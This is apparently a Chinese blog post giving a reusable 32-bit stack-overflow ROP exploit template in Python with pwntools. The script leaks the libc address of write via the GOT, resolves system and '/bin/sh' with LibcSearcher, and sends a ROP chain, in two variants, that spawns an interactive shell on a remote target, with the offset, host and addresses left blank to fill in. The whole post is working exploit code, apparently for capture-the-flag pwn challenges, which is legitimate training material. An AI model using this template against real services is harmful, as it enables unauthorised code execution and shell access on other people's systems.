---
title: "32位栈溢出rop模板"
date: 2021-07-11T17:26:35+08:00
draft: false
---

# 		32位栈溢出rop模板

```python
#!usr/bin/env python
#coding=utf-8
from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
process_name = './'
#p = process([process_name], env={'LD_LIBRARY_PATH':'./'})
p = remote('', )
elf = ELF(process_name)
#**************泄露got并寻找libc
def send_payload(payload):
	payload = 'A'*(偏移) + payload
	p.sendlineafter('', payload)
 
main_addr = 
write_plt = elf.plt['write']
write_got = elf.got["write"]

payload = p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
send_payload(payload)
write_addr = u32(p.recvn(4))
log.info("write_addr => %#x", write_addr)
 
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
log.info("system_addr => %#x", system_addr)
log.info("binsh_addr => %#x", binsh_addr)
#*********************
#*********************调用system（“/bin/sh”）
select = 1
if select == 1:
	#方案1
	payload = p32(system_addr) + p32(main_addr) + p32(binsh_addr)
else:
	#方案2
	read_plt = elf.plt['read']
	pop3_ret = 0x0804856c
	bss_addr = elf.bss()
	payload = p32(read_plt) + p32(pop3_ret) + p32(0) + p32(bss_addr) + p32(8)
	payload += p32(system_addr) + p32(main_addr) + p32(bss_addr)
	payload += '/bin/sh\x00'
 
send_payload(payload)
 
#****************************
p.interactive()
```

